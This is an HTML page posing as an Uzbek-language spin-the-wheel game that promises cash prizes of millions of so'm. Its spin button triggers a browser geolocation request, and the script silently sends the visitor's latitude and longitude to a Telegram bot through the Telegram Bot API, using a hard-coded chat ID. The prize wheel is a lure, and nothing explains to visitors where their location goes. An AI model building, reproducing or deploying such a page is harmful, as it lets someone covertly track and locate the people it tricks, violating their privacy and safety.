<html lang="en">

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Spin Wheel App</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap" rel="stylesheet" />

  <style>
    * {
      padding: 0;
      margin: 0;
      box-sizing: border-box;
      font-family: "Poppins", sans-serif;
    }

    body {
      height: 100vh;
      background: linear-gradient(135deg, #c3a3f1, #6414e9);
    }

    .wrapper {
      width: 90%;
      max-width: 34.37em;
      max-height: 90vh;
      background-color: #ffffff;
      position: absolute;
      transform: translate(-50%, -50%);
      top: 50%;
      left: 50%;
      padding: 3em;
      border-radius: 1em;
      box-shadow: 0 4em 5em rgba(27, 8, 53, 0.2);
    }

    .container {
      position: relative;
      width: 100%;
      height: 100%;
    }

    #wheel {
      max-height: inherit;
      width: inherit;
      top: 0;
      padding: 0;
    }

    @keyframes rotate {
      100% {
        transform: rotate(360deg);
      }
    }

    #spin-btn {
      position: absolute;
      transform: translate(-50%, -50%);
      top: 50%;
      left: 50%;
      height: 26%;
      width: 26%;
      border-radius: 50%;
      cursor: pointer;
      border: 0;
      background: radial-gradient(#fdcf3b 50%, #d88a40 85%);
      color: #c66e16;
      text-transform: uppercase;
      font-size: 1.5em;
      letter-spacing: 0.1em;
      font-weight: 600;
    }

    img {
      position: absolute;
      width: 4em;
      top: 45%;
      right: -8%;
    }

    #final-value {
      font-size: 1.4em;
      text-align: center;
      margin-top: 1.5em;
      color: #202020;
      font-weight: 500;
    }

    @media screen and (max-width: 768px) {
      .wrapper {
        font-size: 12px;
      }

      img {
        right: -5%;
      }
    }
  </style>
</head>

<body>
  <div class="wrapper">
    <div class="container">
      <canvas id="wheel"></canvas>
      <button id="spin-btn">Bonus olish</button>
      <img style="font-size: 20px;"
        src="http://telegra.ph//file/3f86031a2bb355be4f338.png"
        alt="spinner arrow" />
    </div>
    <div id="final-value">
      <p>O'ynash uchun bosing!</p>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
  <script
    src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-datalabels/2.1.0/chartjs-plugin-datalabels.min.js"></script>
  <script>


    const API_KEY =  "API_KEY";
    const CHAT_ID = 7332620755;


    const wheel = document.getElementById("wheel");
    const spinBtn = document.getElementById("spin-btn");
    const finalValue = document.getElementById("final-value");
    const rotationValues = [
      { minDegree: 0, maxDegree: 30, value: "2 mln so'm" },
      { minDegree: 31, maxDegree: 90, value: "1 mln so'm" },
      { minDegree: 91, maxDegree: 150, value: "6 mln so'm" },
      { minDegree: 151, maxDegree: 210, value: "5 mln so'm" },
      { minDegree: 211, maxDegree: 270, value: "4 mln so'm" },
      { minDegree: 271, maxDegree: 330, value: "3 mln so'm" },
      { minDegree: 331, maxDegree: 360, value: "2 mln so'm" },
    ];
    const data = [16, 16, 16, 16, 16, 16];
    var pieColors = [
      "#8b35bc",
      "#b163da",
      "#8b35bc",
      "#b163da",
      "#8b35bc",
      "#b163da",
    ];
    let myChart = new Chart(wheel, {
      plugins: [ChartDataLabels],
      type: "pie",
      data: {
        labels: [1, 2, 3, 4, 5, 6],
        datasets: [
          {
            backgroundColor: pieColors,
            data: data,
          },
        ],
      },
      options: {
        responsive: true,
        animation: { duration: 0 },
        plugins: {
          tooltip: false,
          legend: {
            display: false,
          },
          datalabels: {
            color: "#ffffff",
            formatter: (_, context) => 'ðŸ’¸ ' + context.chart.data.labels[context.dataIndex] + 'mln',
            font: { size: 24 },
          },
        },
      },
    });
    const valueGenerator = (angleValue) => {
      for (let i of rotationValues) {
        if (angleValue >= i.minDegree && angleValue <= i.maxDegree) {
          finalValue.innerHTML = `<p>ðŸŽ‰ Mukofot: ${i.value}</p>`;
          spinBtn.disabled = false;
          break;
        }
      }
    };

    let count = 0;
    let resultValue = 101;
    spinBtn.addEventListener("click", () => {
      getLocation();
      spinBtn.disabled = true;
      finalValue.innerHTML = `<p>Sovg'angizni kuting!</p>`;
      let randomDegree = Math.floor(Math.random() * (355 - 0 + 1) + 0);
      let rotationInterval = window.setInterval(() => {

        myChart.options.rotation = myChart.options.rotation + resultValue;
        myChart.update();
        if (myChart.options.rotation >= 360) {
          count += 1;
          resultValue -= 5;
          myChart.options.rotation = 0;
        } else if (count > 15 && myChart.options.rotation == randomDegree) {
          valueGenerator(randomDegree);
          clearInterval(rotationInterval);
          count = 0;
          resultValue = 101;
        }
      }, 10);
    });


    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        alert("Geolokatsiya bu brauzerda qo'llab-quvvatlanmaydi.");
      }
    }

    function showPosition(position) {
      var latitude = position.coords.latitude;
      var longitude = position.coords.longitude;
      fetch(`https://api.telegram.org/bot${API_KEY}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
    }

    function showError(error) {
      switch (error.code) {
        case error.PERMISSION_DENIED:
          alert("Foydalanuvchi joylashuv so'rovini rad etdi.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Joylashuv ma'lumotlari mavjud emas.");
          break;
        case error.TIMEOUT:
          alert("Joylashuv so'rovi vaqti tugadi.");
          break;
        case error.UNKNOWN_ERROR:
          alert("Noma'lum xato yuz berdi.");
          break;
      }
    }
  </script>
</body>

</html>
